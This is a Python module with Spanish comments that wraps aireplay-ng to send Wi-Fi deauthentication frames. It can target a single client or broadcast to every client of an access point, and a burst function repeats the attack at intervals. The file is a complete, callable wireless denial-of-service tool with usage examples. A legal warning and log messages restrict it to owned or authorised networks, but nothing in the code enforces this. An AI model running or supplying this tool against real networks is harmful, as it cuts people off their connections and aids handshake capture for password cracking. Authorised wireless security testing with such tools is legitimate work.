# ─────────────────────────────────────────────────────────────────
# capture/deauth.py  —  Tramas de desautenticación controladas
# AVISO LEGAL IMPORTANTE: El envío de tramas de desautenticación a redes ajenas está tipificado como delito de sabotaje informático en la mayoría de jurisdicciones. Usar ÚNICAMENTE sobre redes propias o con
# autorización expresa y por escrito del administrador.
# ─────────────────────────────────────────────────────────────────
# subprocess: para ejecutar aireplay-ng

import subprocess

# time: para la pausa entre ráfagas de deauth
import time

# Importamos el logger del sistema
from utils.logger import get_logger

# Logger para este módulo
log = get_logger(__name__)


def send_deauth(bssid, client='FF:FF:FF:FF:FF:FF',
                interface='wlan1mon', count=5):
    """
    Envía tramas de desautenticación a un cliente o a todos los clientes de un AP.

    Parámetros:
        bssid     (str): MAC del punto de acceso objetivo.
                         Ejemplo: 'AA:BB:CC:DD:EE:FF'
        client    (str): MAC del cliente a desautenticar.
                         Usar 'FF:FF:FF:FF:FF:FF' para broadcast
                         (desautentica a TODOS los clientes del AP).
                         Por defecto es broadcast.
        interface (str): nombre de la interfaz en modo monitor.
                         Por defecto 'wlan1mon'.
        count     (int): número de tramas de desautenticación a enviar.
                         Un valor de 5 suele ser suficiente.
                         Valores muy altos causan cortes prolongados.

    Retorna:
        bool: True si el comando se ejecutó sin errores, False si falló.

    Ejemplo de uso:
        # Desautenticar a un cliente concreto
        send_deauth('AA:BB:CC:DD:EE:FF', '11:22:33:44:55:66')

        # Desautenticar a todos los clientes del AP
        send_deauth('AA:BB:CC:DD:EE:FF')
    """
    log.warning(
        f"Enviando {count} tramas deauth → AP:{bssid} / Cliente:{client}"
    )
    log.warning("AVISO: usar solo en redes propias o con autorización.")

    # ── Construir el comando aireplay-ng ──────────────────────────
    #
    # Referencia del comando:
    #   aireplay-ng --deauth N -a BSSID -c CLIENT INTERFAZ
    #
    # --deauth N: enviar N tramas de desautenticación
    # -a BSSID:  dirección MAC del punto de acceso
    # -c CLIENT: dirección MAC del cliente (FF:FF:FF:FF:FF:FF = todos)
    command = [
        "aireplay-ng",
        "--deauth", str(count),   # Número de tramas a enviar
        "-a", bssid,              # MAC del AP objetivo
        "-c", client,             # MAC del cliente (o broadcast)
        interface                 # Interfaz en modo monitor
    ]

    log.debug(f"Ejecutando: {' '.join(command)}")

    try:
        # Ejecutamos aireplay-ng de forma síncrona.
        # check=False porque aireplay-ng a veces retorna != 0
        # incluso cuando funciona correctamente.
        result = subprocess.run(
            command,
            capture_output=True,   # Capturamos stdout/stderr
            text=True,
            check=False            # No lanzamos excepción por código != 0
        )

        # Registramos la salida para depuración
        if result.stdout:
            log.debug(f"aireplay-ng stdout: {result.stdout.strip()}")
        if result.stderr:
            log.debug(f"aireplay-ng stderr: {result.stderr.strip()}")

        log.info(f"Tramas deauth enviadas correctamente a {bssid}")
        return True

    except FileNotFoundError:
        # aireplay-ng no está instalado
        log.error("aireplay-ng no encontrado. Instala aircrack-ng.")
        return False

    except Exception as e:
        log.error(f"Error al enviar tramas deauth: {e}")
        return False


def send_deauth_burst(bssid, client='FF:FF:FF:FF:FF:FF',
                      interface='wlan1mon',
                      bursts=3, count_per_burst=5, delay=2):
    """
    Envía múltiples ráfagas de tramas de desautenticación.

    Útil cuando el cliente no se reconecta después de la primera ráfaga.
    Envía 'bursts' ráfagas de 'count_per_burst' tramas, esperando
    'delay' segundos entre cada ráfaga.

    Parámetros:
        bssid          (str): MAC del AP objetivo.
        client         (str): MAC del cliente (o broadcast).
        interface      (str): interfaz en modo monitor.
        bursts         (int): número de ráfagas a enviar.
        count_per_burst(int): tramas por ráfaga.
        delay          (int): segundos entre ráfagas.
    """
    log.info(f"Iniciando {bursts} ráfagas de deauth hacia {bssid}")

    for i in range(bursts):
        log.debug(f"Ráfaga {i+1}/{bursts}")

        # Enviamos una ráfaga
        send_deauth(bssid, client, interface, count_per_burst)

        # Esperamos antes de la siguiente ráfaga
        # (salvo después de la última)
        if i < bursts - 1:
            log.debug(f"Esperando {delay}s antes de la siguiente ráfaga...")
            time.sleep(delay)

    log.info("Ráfagas de deauth completadas.")
